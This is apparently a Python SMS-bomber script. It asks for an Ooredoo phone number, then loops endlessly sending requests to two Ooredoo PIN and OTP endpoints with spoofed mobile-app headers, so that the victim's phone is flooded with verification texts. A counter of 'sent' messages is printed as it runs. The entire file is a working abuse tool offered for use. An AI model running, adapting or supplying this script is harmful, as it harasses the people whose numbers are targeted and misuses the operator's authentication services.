import os
try:
 import requests
except:
 os.system('pip install requests')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(f'''{B}{E}==============================
|{G}[+] GitHub    : {B}whisper-666 |
|{G}[+] InstaGram : {B}_whisper.io_|
|{G}[+] TeleGram  : {B}whisper_io  |
{E}==============================''')
nmbr=input(f'{S}[+] OredoO Number ==> {B}')
print(f'{E}==============================')
mod=input(f'''{B}[01] My Ooredoo
{E}==============================
{B}[02] Yooz
{E}==============================
{G}[$$] Chose ==> ''')
print(f'{E}==============================')
if '1' in mod:
 snt=0
 while True:
  data=f'appVersion=46&channel=Mobile&locale=fr&msisdn={nmbr}&deviceId=f95adeefae1e6199&platform=Android%2C%20OS%20Version%208.0.0'
  head={
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "125",
    "Host": "my.ooredoo.dz",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.10.0"}
  spam=requests.post('https://my.ooredoo.dz/OdzMobile/rest/profile/register/pin',data=data,headers=head).json()['responseStatus']['responseMsgFr']
  if spam == 'Un code PIN de confirmation vous a été envoyé par SMS':
   snt+=1
   print(f'{G}[{snt}] {B}{spam}')
  else:
   print(f'{E}[×] {spam}')
if '2' in mod:
 snt=0
 while True:
  data=f'client_id=ibiza-app&grant_type=password&mobile-number={nmbr}&language=EN'
  head={
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "76",
    "Host": "ibiza.ooredoo.dz",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.2.0"}
  spam=requests.post('https://ibiza.ooredoo.dz/auth/realms/ibiza/protocol/openid-connect/token',data=data,headers=head).json()['error']
  if spam == 'Welcome to IBIZA':
   snt+=1
   print(f'{G}[{snt}] {B}{spam}')
  if spam == 'OTP required':
   snt+=1
   print(f'{G}[{snt}] {B}ROOGY has just sent you a new PIN code')
  else:
   print(f'{E}[×] {spam}')